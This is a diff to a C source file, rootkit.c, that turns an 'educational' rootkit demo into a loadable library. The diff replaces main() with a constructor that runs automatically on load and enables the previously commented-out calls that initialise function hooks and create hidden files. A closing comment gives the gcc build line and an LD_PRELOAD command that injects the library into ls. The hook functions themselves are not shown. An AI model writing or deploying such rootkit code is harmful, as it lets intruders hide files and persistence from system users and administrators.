@@ -203,26 +203,26 @@ void demonstrate_rootkit_hiding() {
     printf("\n");
 }
 
-int main() {
-    printf("=== Educational Rootkit Demonstration ===\n");
-    printf("WARNING: This is for educational purposes only!\n");
-    printf("This demonstrates how rootkits hide their presence.\n\n");
+// Constructor function that runs when the library is loaded
+__attribute__((constructor))
+void rootkit_init() {
+    printf("=== Rootkit Library Loaded ===\n");
     
     // Initialize the rootkit
-   // init_original_functions();
+    init_original_functions();
     
     // Create hidden files
-   // create_hidden_files();
-    
-    // Demonstrate hiding
-  //  demonstrate_rootkit_hiding();
+    create_hidden_files();
     
     printf("=== Rootkit Active ===\n");
-    printf("The rootkit is now running and hiding files.\n");
-    printf("Press Enter to continue...\n");
-    getchar();
-    
-    return 0;
+    printf("Files are now being hidden!\n\n");
+}
+
+// Destructor function that runs when the library is unloaded
+__attribute__((destructor))
+void rootkit_cleanup() {
+    printf("=== Rootkit Library Unloaded ===\n");
 }
 
 // gcc -shared -fPIC -o librootkit.so rootkit.c -ldl
+// LD_PRELOAD=./librootkit.so ls -la /tmp/
